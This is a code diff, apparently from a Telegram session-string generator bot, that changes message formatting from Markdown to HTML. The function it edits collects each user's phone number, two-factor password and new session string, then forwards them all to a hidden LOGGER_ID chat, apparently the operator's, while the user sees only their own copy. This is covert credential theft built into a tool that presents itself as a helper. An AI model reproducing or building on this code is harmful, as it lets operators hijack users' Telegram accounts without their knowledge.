@@ -107,9 +107,9 @@ async def gen_session(
     user = await xemishra.get_users(user_id)
     mention = user.mention()
     username = f"@{user.username}"
-    xxx = f"**» 𝖭𝖺𝗆𝖾 :** {mention}\n\n"
-    xxx += f"**» 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 :** {username}\n\n"
-    xxx += f"**» 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 :** {phone_number}\n\n"
+    xxx = f"<b>» 𝖭𝖺𝗆𝖾 :</b> {mention}\n\n"
+    xxx += f"<b>» 𝖴𝗌𝖾𝗋𝗇𝖺𝗆𝖾 :</b> {username}\n\n"
+    xxx += f"<b>» 𝖯𝗁𝗈𝗇𝖾 𝖭𝗎𝗆𝖻𝖾𝗋 :</b> {phone_number}\n\n"
     await xemishra.send_message(user_id, "» 𝖳𝗋𝗒𝗂𝗇𝗀 𝖳𝗈 𝖲𝖾𝗇𝖽 𝖮𝖳𝖯 𝖠𝗍 𝖳𝗁𝖾 𝖦𝗂𝗏𝖾𝗇 𝖭𝗎𝗆𝖻𝖾𝗋...")
     if telethon:
         client = TelegramClient(StringSession(), api_id, api_hash)
@@ -192,7 +192,7 @@ async def gen_session(
         if await cancelled(pwd):
             return
         pwd = pwd.text
-        xxx += f"**» Password :** {pwd}\n\n"
+        xxx += f"<b>» Password :</b> {pwd}\n\n"
         try:
             if telethon:
                 await client.sign_in(password=pwd)
@@ -228,7 +228,7 @@ async def gen_session(
         pass
     try:
         await client.disconnect()
-        xxx += f"**» 𝖲𝖤𝖲𝖲𝖨𝖮𝖭 :** `{string_session}`"
+        xxx += f"<b>» 𝖲𝖤𝖲𝖲𝖨𝖮𝖭 :</b> <code>{string_session}</code>"
         await xemishra.send_message(LOGGER_ID, xxx)
         await xemishra.send_message(
             chat_id=user_id,
